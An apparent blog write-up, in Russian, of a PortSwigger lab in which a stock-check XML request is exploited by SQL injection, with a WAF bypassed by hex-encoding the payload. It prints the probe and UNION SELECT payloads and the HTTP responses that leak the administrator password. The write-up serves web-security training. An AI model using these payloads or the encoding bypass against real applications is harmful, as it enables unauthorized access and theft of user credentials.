---
title: "SQL injection with filter bypass via XML encoding"
date: 2025-06-20
tags: [sqli, writeup, web]  
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-in-different-contexts/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding"
---

В лабе есть уязвимая к **SQL injection** проверка товара в магазине. В БД есть таблица `users`, которая содержит в себе списки зарегистрированных пользователей с их паролями. Для прохождения нужно получить доступ к личному кабинету администратора.

```
https://0a870041040afc00b575af4f00f900e1.web-security-academy.net/
```

## Solution

Первым делом нужно найти уязвимый запрос. На странице товара есть кнопка `check stock`, при нажатии она отправляет запрос на сервер. Сам запрос выглядит так:

```http
POST /product/stock HTTP/2
Host: 0a870041040afc00b575af4f00f900e1.web-security-academy.net
Cookie: session=K3VtfuVea5xBSJ82exXvOubl0Ohs9Gb0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a870041040afc00b575af4f00f900e1.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0a870041040afc00b575af4f00f900e1.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Можно заметить, что тело запроса содержит `XML` документ. В нем есть 2 значения: `productId` и `storeId`. Попробую подставить пейлоад в эти параметры:

```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1';</storeId></stockCheck>
```

Мне пришел ответ с сообщением `Attack detected`:

```http
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

"Attack detected"
```

Скорее всего на сайте используется `WAF`. Для обхода попробую кодировать пейлод в `HEX` формат. Для этого `Burp Suite Academy` предлагает установить расширение [hackvertor](https://github.com/hackvertor/hackvertor/releases/tag/v1.8.10).

![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-with-filter-bypass-via-XML-encoding/1.png){: height="200" .align-center}

Итак, попробую подобрать пейлоад для поля `storeId`:

```
1+1 - Ok
1+2 - Ok
1 UNION SELECT '1234'-- -
```

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

1234
953 units
```

Попробую получить пароль для пользователя `administrator` с помощью следующего пейлоада:

```
1 UNION SELECT password FROM users WHERE username = 'administrator'-- -
```

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 30

06g5dq8793lynap20w97
953 units
```

Проверю пароль:

![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-with-filter-bypass-via-XML-encoding/2.png){: height="200" .align-center}

Я в системе)
